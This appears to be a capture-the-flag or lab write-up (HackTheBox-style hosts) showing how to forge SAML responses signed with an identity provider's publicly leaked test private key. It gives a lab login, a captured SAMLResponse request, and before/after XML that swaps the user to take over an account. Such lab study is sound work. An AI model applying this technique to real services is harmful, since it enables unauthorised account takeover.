This kind of attack as the name tells is an attack that targets SAML tokens, and specifically weak Privatte/Public keys used by the IDP aka Identity Provider to sign the tokens.
If an attacker can successfully change the name ID in the SAML response, they can log in as that user due to a lack of signature checking. To validate the signature, the X.509 public certificate of the Identity Provider (IdP) is required.

## How to attack
1)Identify a weak-key(PUBLIC) saml request example this one (login with credentials **admin:lv38g^e6A5JkJN**)
```
POST /sp/acs HTTP/1.1
Host: sp1.htb.net

SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfMWE0OTRhNjQ4NzdiN2U0YTlm
MzE1MTQzY2E2NzIyYjdlODRiNmFhMmJkIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNC0wMi0xMlQxMTo1MTowNVoiIERlc3RpbmF0aW9uPSJodHRwOi8vc3AxLmh0Yi5uZXQvc3AvYWNzIiBJblJlc3BvbnNlVG89Il8zMjMzMjc1OS1mNzhmLTQ4OTMtO
TFiYi02NDQ1YmJhZTVkM2YiPjxzYW1sOklzc3Vlcj5odHRwOi8vaWRwMS5odGIubmV0L3NpbXBsZXNhbWxwaHAvc2FtbDIvaWRwL21ldGFkYXRhLnBocDwvc2FtbDpJc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8w
%2BPHNhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj48c2FtbDpBdWRpZW5jZT5odHRwOi8vc3AxLmh0Yi5uZXQvc3AvbWV0YWRhdGE8L3NhbWw6QXVkaWVuY2U%2BPC9zYW1sOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9zYW1sOkNvbmRpdGlvbnM%2BPHNhbWw6QXV0aG5T
<snip>
```
2)URL+B64 decode the token 
```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1a494a64877b7e4a9f315143ca6722b7e84b6aa2bd" Version="2.0" 
IssueInstant="2024-02-12T11:51:05Z" Destination="http://sp1.htb.net/sp/acs" InResponseTo="_32332759-f78f-4893-91bb-6445bbae5d3f"><saml:Issuer>http://idp1.htb.net/simplesamlphp/saml2/idp/metadata.php
</saml:Issuer+PGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy5...<snip>...+PC9zYW1sOkF0dHJpYnV0ZT48L3NhbWw6QXR0cmlidXRlU3RhdGVtZW50Pjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=
```
3)take the last part of the token and google it to find the Privatekey(maybe in Github repositories)
```
DgmO6TarJ8O0...SNIP...tX0hoHuAQ==
```
4)You find that is the Private-key/Certificate from this:
https://github.com/rstudio/crewjam-saml/blob/master/samlidp/samlidp_test.go
5)Install **"SamlRider"** extension in Burpsuite and import the Privatekey & Certificate:
```
private.pem = PrivateKey (import via "Traditional RSA PEM" import in SAML Raider)
public.crt = Certificate (import via import function in  SAML Raider)
```
6)Fetch the request from victim website with **SamlRequest=xxx**, send it to **Burp Repeater -> SAML Raider(from Repeater page)**
7)Check that Private-key is loaded under **Repeater -> SAMLRaider -> XML Signature attack**
8)Modify the code to match your attack, example by tampering the user so we can perform a takeover:
```
Before:
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1a494a64877b7e4a9f315143ca6722b7e84b6aa2bd" Version="2.0" IssueInstant="2024-02-12T11:51:05Z" Destination="http://sp1.htb.net/sp/acs" ...
<saml:AttributeValue xsi:type="xs:string">admin@htb.net</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>

After:
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1a494a64877b7e4a9f315143ca6722b7e84b6aa2bd" Version="2.0" IssueInstant="2024-02-12T11:51:05Z" Destination="http://sp1.htb.net/sp/acs" ...
<saml:AttributeValue xsi:type="xs:string">hackme@htb.net</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
```
9)Re-sign Assertions
10)Upon send via SamlRaider now you should get a JWT token that contains a flag!